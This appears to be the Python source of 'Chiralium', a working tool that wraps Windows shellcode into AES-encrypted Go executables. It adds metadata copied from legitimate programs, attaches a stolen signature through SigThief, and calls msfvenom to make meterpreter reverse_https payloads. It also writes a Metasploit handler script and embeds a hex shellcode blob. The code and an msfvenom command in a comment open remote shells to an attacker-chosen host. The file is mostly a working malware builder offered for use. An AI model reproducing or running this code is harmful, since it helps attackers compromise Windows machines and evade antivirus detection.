#!/usr/bin/python3
# -*- coding: utf-8 -*-


import sys
import os
import shutil
import argparse
import hashlib
import subprocess, shlex
import random
import string
import yaml
from termcolor import colored, cprint
import binascii

from Crypto.Cipher import AES

# key must be 16, 24 32
# iv must be 16
def encrypthat(key,iv,cleartext):
	# first, pad with  nop to be a multiple of 16 bytes
	length = 16 - (len(cleartext) % 16)
	cleartext += '90' * (length // 2)
	obj = AES.new(str.encode(key), AES.MODE_CBC, str.encode(iv))
	ciphertext = obj.encrypt(str.encode(cleartext))
	# print(binascii.hexlify(key))
	return(ciphertext)

def decryptthat(key,iv,ciphertext):
	obj2 = AES.new(key, AES.MODE_CBC, iv)
	cleartext = obj2.decrypt(ciphertext)
	return(cleartext)

# working SC : msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_https LHOST=192.168.1.46 LPORT=8443 ReverseConnectRetries=255 EXITFUNC=thread EnableStageEncoding=true prependmigrate=true prependmigrateprocess=explorer.exe StageEncoder=x64/xor -b '\x00\xff'  -f hex -o /tmp/hexpayload
def banner():
	txt = \
	"""
 _____ _     _           _ _                 
/  __ \ |   (_)         | (_)                
| /  \/ |__  _ _ __ __ _| |_ _   _ _ __ ___  
| |   | '_ \| | '__/ _` | | | | | | '_ ` _ \ 
| \__/\ | | | | | | (_| | | | |_| | | | | | |
 \____/_| |_|_|_|  \__,_|_|_|\__,_|_| |_| |_|
	
 A shellcode-to-binary generator for Windows
		@kaluche_
                                             
	"""
	print(txt)

# just check that everything looks good before begin
def safechecks(appdir):
	
	bad = 0
	# CHECK GO
	s = os.system("go version  > /dev/null 2>&1")
	if not s == 0:
		cprint("[-] 'go version' return an error... Is GO in your PATH ?", "red")
		bad = 1
	if not os.path.isdir('{0}/src'.format(appdir)):
		cprint("[-] Directory not found : {0}/src/".format(appdir), "red")
		bad = 1
	if not os.path.isfile('{0}/src/main.go'.format(appdir)):
		cprint("[-] File not found: {0}/src/main.go".format(appdir), "red")
		bad = 1

	if not os.path.isfile('{0}/libs/sigthief.py'.format(appdir)):
		cprint("[-] Sigthief not found: {0}/libs/sigthief.py".format(appdir), "red")
		bad = 1

	if not os.path.isdir('{0}/shellcode'.format(appdir)):
		cprint("[-] Directory not found : {0}/shellcode/".format(appdir), "yellow")
		os.mkdir('{0}/shellcode/'.format(appdir))
		cprint("[-] Directory {0}/shellcode/ is now created.".format(appdir), "yellow")

	if not os.path.isfile('{0}/shellcode/calc.hex'.format(appdir)):
		cprint("[-] File not found: {0}/shellcode/calc.hex".format(appdir), "yellow")
		calchex = "beac40d433d9ebd97424f45f33c9b13131771383c7040377a3a221cf53a0ca30a3c543d592c5309d84f533f3287d11e0bbf3be070cb998268d92d9290de90d8a2c2240cb695fa999222b1c0e47619da51b67a55aeb8684cc60d106eea5690fe8aa54d9831822d84551cb77a85e3e89ec58a1fc049b5c07d3e6ba82c04048342d719da3a67d6aa7e1616d649a9de68b4d14bcaf497d66d1c8dbc9ee0b84b64a4728a2e60a263574310435863a385eb7b1d71948109cd60239b47ecbab85e2ec01c91a6fa0b1d86fc1b4a53739c4b6dd3d7bb6f75d1a249b8fb9cc3ed0"
		with open('{0}/shellcode/calc.hex'.format(appdir),'w') as f:
			f.write(calchex)
		cprint("[-] Directory {0}/shellcode/calc.hex is now created.".format(appdir), "yellow")

	if not os.path.isdir('{0}/output'.format(appdir)):
	 	cprint("[-] Directory not found: {0}/output/.".format(appdir), "yellow")
	 	os.mkdir('{0}/output/'.format(appdir))
	 	cprint("[-] Directory {0}/output/ is now created.".format(appdir), "yellow")

	if bad == 1:
		print('[-] Fix this before anything. Exiting')
		sys.exit(0)
	# CHECK TEMPLATE


	
def craftgofile(shellcodefile,outputdir,biname,appdir,eicar):
	try:
		print("[+] Using",colored("{0}".format(shellcodefile),"green"),"as hex shellcode ...")
		# read template GO file
		if not os.path.isfile(shellcodefile):
			cprint("[-] Shellcode file doesn't exist ! Exiting", "red")
			sys.exit()
		with open(shellcodefile,'r') as f:
			shellcode = f.read()
		
		# replace values
		with open('{0}/src/main.go'.format(appdir),'r') as f:
			content_go = f.read()
		key = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(16))
		iv = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(16))
		shellcode_encrypt = encrypthat(key,iv,shellcode)
		
		key = str(binascii.hexlify(key.encode()).decode('utf-8'))
		iv = str(binascii.hexlify(iv.encode()).decode('utf-8'))
		shellcode_encrypt = str(binascii.hexlify(shellcode_encrypt).decode('utf-8'))
		

		# print(key,iv,shellcode_encrypt)
		print("[+] Using",colored("AES-CBC","yellow"),"with unique",colored("IV & KEY","yellow"),"to encrypt the shellcode ... ")
		content_go = content_go.replace("_KEY_",key)
		content_go = content_go.replace("_IV_",iv)
		content_go = content_go.replace("_SHELLCODE_",shellcode_encrypt)
		if eicar == True:
			print("[+] Using",colored("EICAR","yellow"),"pattern in binary... ")
			eicar_var_name = ''.join(random.choice(string.ascii_lowercase) for x in range(4))
			eicar_pattern = "X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
			eicar_full = """{var} := \"{pattern}\"\n\tfmt.Println({var})""".format(var=eicar_var_name,pattern=eicar_pattern)
			content_go = content_go.replace('// "__EICAR__"',eicar_full)
		else:
			content_go = content_go.replace('// "__EICAR__"','// main')
		# write tmp GO file with current values.
		# will be use to "go build"
		with open('{0}/{1}.go'.format(outputdir,biname),'w') as f:
			f.write(content_go)
	except Exception as e:
		cprint("[-] An error occurred while crafting the binary : {0}".format(e), "red")


def buildbinary(platform,arch,outputdir,biname,metadata):

	try:
		# Need to move .go and .syso to the same dir, without any other .go file. 
		# I can't build with metadata if I specify my .go file, it's stupid. But I don't know why :/

		# temp dir to build here & add metada
		tmpdir = "{0}/tmp/".format(outputdir)
		if not os.path.isdir(tmpdir):
	 		os.mkdir(tmpdir)

		print("[+] Using metadata from",colored("{0}".format(metadata),"green"),"...")
		subprocess.Popen(shlex.split("cp res/syso/{0}.syso {1}/{2}.go {3}".format(metadata,outputdir,biname, tmpdir)), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

		print("[+] Building binary for arch",colored("{0}".format(arch),"green"),"...")
		cmdbuild = "cd {2} && GOOS={0} GOARCH={1} go build -o {3}".format(platform,arch,tmpdir,biname)
		print("[+] Building:",colored("{0}".format(cmdbuild),"green"))
		s = os.system(cmdbuild)
		
		# move exe & go file. 
		print("[+] Moving/removing all from",colored("{0}".format(tmpdir),"yellow"),"to",colored("{0}".format(outputdir),"yellow"),"...")
		
		files_in_tmp = os.listdir(tmpdir)
		for f in files_in_tmp:
			if not f.endswith("syso"):
				shutil.move(tmpdir + f, outputdir + "/" + f)
		# delete the tmp dir
		shutil.rmtree(tmpdir)
		if s == 0:
			print("[+] Go file is:", colored("{0}/{1}.go ".format(outputdir,biname),"green"))
			print("[+] Binary file is:", colored("{0}/{1} ".format(outputdir,biname),"green"))
		else:
			cprint("[-] An error occurred while building the binary ...", "red")
			sys.exit()
	except Exception as e:
		cprint("[-] An error occurred while building the binary : {0}".format(e), "red")



def msfvenom_generator(platform,arch,shellcodedir,shellcodename,lhost,lport,msfparams):	
	s = os.system("msfvenom -h  > /dev/null 2>&1")
	# why 256 ? I don't know, it's the return value for me... Change that if problem
	if not s == 256:
		cprint("[-] 'msfvenom -h' return an error... Is metasploit installed ?", "red")
		sys.exit()
	if arch == "x86" or arch == "386":
		arch = "x86"
		payload = "windows/meterpreter/reverse_https"
	elif arch == "x64" or arch == "amd64":
		arch = "x64"
		payload = "windows/x64/meterpreter/reverse_https"

	cmd = "msfvenom -a {0} --platform {1} -p {2} LHOST={3} LPORT={4} {5} -o {6}/{7}.hex > /dev/null 2>&1".format(arch,platform,payload,lhost,lport,msfparams,shellcodedir,shellcodename)
	print("[+] Generating the hex shellcode with",colored("msfvenom","green"),". It can take a while, you know, msfvenom...")
	print("[+] Payload:",colored(payload,"green"))
	s = os.system(cmd)
	if not s == 0:
		cprint("[-] An error occurred with msfvenom ...", "red")
		sys.exit()
	
	print("[+] Meterpreter shellcode is now saved at",colored("{0}/{1}".format(shellcodedir,shellcodename),"green"))
	rc = msfvenom_generator_rc(payload,lhost,lport)
	rcfile = '{0}/{1}.rc'.format(shellcodedir,shellcodename)
	with open(rcfile,'w') as f:
		f.write(rc)
	print("[+] You can use this resource file :",colored(rcfile + "\n" + rc,'blue'))

# Using sigthief (https://github.com/secretsquirrel/SigThief) to add an (invalid) signature to the binary
def sign_binary(biname,outputdir,signature):
	print("[+] Using SigThief to sign the binary with the signature",colored(signature,"yellow"))
	cmd = "python3 libs/sigthief.py -t {0}/{1} -s {2} -o {0}/{1}_signed.exe".format(outputdir,biname,signature)
	subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	print("[+] Signature add ! Binary signed is:",colored("{0}/{1}_signed.exe".format(outputdir,biname),"green"))

# create the resource file for msf
def msfvenom_generator_rc(payload,lhost,lport):
	rc = "use exploit/multi/handler\n"
	rc += "set PAYLOAD {0}\n".format(payload)
	rc += "set LHOST {0}\n".format(lhost)
	rc += "set LPORT {0}\n".format(lport)
	rc += "set ExitOnSession false\n"
	rc += "exploit -j"
	return rc



#### MAIN ####
if __name__ == '__main__':

	banner()
	# application directory
	_appdir = os.path.dirname(os.path.abspath(__file__))
	# Read the config file first
	with open("{0}/config.yml".format(_appdir), 'r') as ymlfile:
	    config = yaml.safe_load(ymlfile)
	
	_arch = str(config['arch'])
	_outputdir = "{0}/{1}".format(_appdir,config['outputdir']) # abspath to output dir
	_shellcodedir = "{0}/{1}".format(_appdir,config['shellcodedir']) # abspath to shellcode dir
	_shellcodefile = "{0}/{1}".format(_shellcodedir,config['shellcodefile']) # abspath to default shellcode file
	_msfvenomargs86 = config['msfvenomargs86']
	_msfvenomargs64 = config['msfvenomargs64']
	_platform = config['platform']
	
	safechecks(_appdir)

	parser = argparse.ArgumentParser(description="Chiralium : a dirty GO shellcode-to-binary generator.")
	parser.add_argument('-p', '--platform', type=str, default=_platform, help="Platform for compilation (windows only for the moment)")
	parser.add_argument('-sc', '--shellcode', type=str, help="File containing HEX shellcode (41414141)")
	parser.add_argument('-m', '--metadata', type=str, default="bginfo", help="Choose metadata to add using 'syso' COFF (pre-generated with goversioninfo) : none, bginfo,putty")
	parser.add_argument('-s', '--signature', type=str, default="signatures/Tcpview.exe_sig", help="Choose signature file to add (default: signatures/Tcpview.exe_sig)")
	parser.add_argument('-a', '--arch', type=str, default="x86", help="The architecture to use (x86 or x64)")
	parser.add_argument('-t', '--test', action='store_true', default=False, help="Test to build a default shellcode that spawn a calc.")
	parser.add_argument('-msf', '--msfvenom', action='store_true', default=False, help="Generate a meterpreter/reverse_https shellcode with msfvenom")
	parser.add_argument('--eicar', action='store_true', default=False, help="Add the EICAR pattern in binary")
	parser.add_argument('-lhost','--lhost', type=str, help="LHOST for msfvenom payload generator ")
	parser.add_argument('-lport','--lport', type=str, default="8443", help="LPORT for msfvenom payload generator (default 8443).")
	parser.add_argument('-rc','--rc', action='store_true', default=False, help="Autorun the resource file with msfconsole (only with --msfvenom")
	parser.add_argument('-o', '--output', type=str, help="The binary name (default is random), build in {0}/".format(_outputdir))
	args = parser.parse_args()
	
	if len(sys.argv) == 1:
	    parser.print_help()
	    sys.exit()

	if args.test:
		cprint("[-] Test mode activate : ignoring all options, using default.","yellow")
		craftgofile(_shellcodefile,_outputdir, "test_calc.exe",_appdir,args.eicar)
		buildbinary("windows", "386", _outputdir,"test_calc.exe",args.metadata)
		sign_binary("test_calc.exe",_outputdir,args.signature)
		sys.exit()

	# ARCH
	if args.arch:
		if args.arch == "x86" or args.arch == "386":
			goarch = "386"
			msfvenomargs = _msfvenomargs86
		elif args.arch == "x64" or args.arch == "amd64":
			goarch = "amd64"
			msfvenomargs = _msfvenomargs64
		else:
			goarch = _arch
			msfvenomargs = _msfvenomargs86
			print("[+] Can't use arch as",colored("{0}".format(args.arch),"red"),"(x86 or x64 only) ! Using default ...")
	if not args.arch:
		goarch = _arch
	# PLATFORM
	if args.platform:
		if args.platform.lower() != "windows":
			cprint("Only windows is supported for the moment. Exiting.","red")
			sys.exit()
		goos = args.platform
	else:
		goos = _platform

	if args.output:
		_biname = args.output
	else:
		_biname = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(8)) 
		_biname += ".exe"

	# SHELLCODE FILE + CRAFT
	if args.shellcode:
		craftgofile(args.shellcode,_outputdir, _biname, _appdir,args.eicar)
	elif args.msfvenom == True: 
		if not args.lhost:
			cprint("[-] LHOST is not specify ! Use --lhost ATTACKER_IP. Exiting", "red")
			sys.exit()
		msfvenom_generator(_platform, goarch, _shellcodedir, _biname, args.lhost, args.lport,msfvenomargs)
		craftgofile("{0}/{1}.hex".format(_shellcodedir,_biname),_outputdir, _biname, _appdir,args.eicar)
	else:
		print(args.msfvenom)
		print("[+] No shellcode specify ! Using default {0} ...".format(_shellcodefile))
		craftgofile(_shellcodefile,_outputdir, _biname, _appdir,args.eicar)

	# BINARY BUILDING
	buildbinary(goos, goarch, _outputdir, _biname,args.metadata)
	sign_binary(_biname,_outputdir,args.signature)
	if args.rc and args.msfvenom:
		cprint("[-] Running msfconsole with associated resource file...", "blue")
		cmd = os.system("msfconsole -r {0}/{1}.rc".format(_shellcodedir,_biname))